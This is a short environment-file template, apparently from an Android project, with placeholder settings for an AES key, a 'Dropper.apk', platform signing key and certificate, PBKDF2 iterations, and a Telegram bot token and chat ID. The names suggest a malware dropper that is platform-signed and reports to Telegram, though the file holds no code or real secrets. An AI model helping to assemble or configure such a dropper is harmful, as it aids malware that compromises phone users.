# Copy this file to .env and fill in your values.
# .env is gitignored — never commit it with real credentials.

AES_KEY=<64-char hex string — 32 random bytes>
DROPPER_APK=Dropper.apk
PLATFORM_KEY=key.pk8
PLATFORM_CERT=certificate.pem
PBKDF2_ITERATIONS=65536

# Telegram Bot
TELEGRAM_BOT_TOKEN=<token from @BotFather>
TELEGRAM_CHAT_ID=<your numeric chat ID from @userinfobot>
